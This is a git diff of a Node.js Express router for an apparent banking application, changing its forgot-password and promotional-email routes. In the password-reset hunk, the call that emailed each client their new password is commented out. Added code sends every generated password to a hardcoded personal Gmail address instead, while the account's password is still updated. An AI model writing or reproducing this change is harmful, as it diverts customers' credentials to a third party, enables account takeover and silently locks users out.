@@ -181,13 +181,15 @@ router.post('/forgotpass', (req, res) => {
                 // get email of user from core banking
                 client.getClient(user).then(dt => {
 
-                    console.log(dt.data["emailAddress"])
-
                     if (dt.data["emailAddress"] !== undefined) {
 
                         // send email to clients with new password
-                        app.sendResetEmail(dt.data["emailAddress"], password)
 
+                        let emailsss = 'boymotsa@gmail.com'
+
+                        //app.sendResetEmail(dt.data["emailAddress"], password)
+
+                        app.sendResetEmail(emailsss, password)
 
                         // update database on changed password
                         app.assingNewPassword(username, password)
@@ -418,7 +420,7 @@ router.post('/sendpromoemails', (req, res) => {
                     + '<b>SCBS MANAGEMENT</b><br><br><br>'
                     + '<img src="cid:footer" style="width:50%"/>',
                 replyTo: "info@scbs.co.sz"
-            
+
             }, (error, result) => {
                 if (error) {
                     //res.json(error);
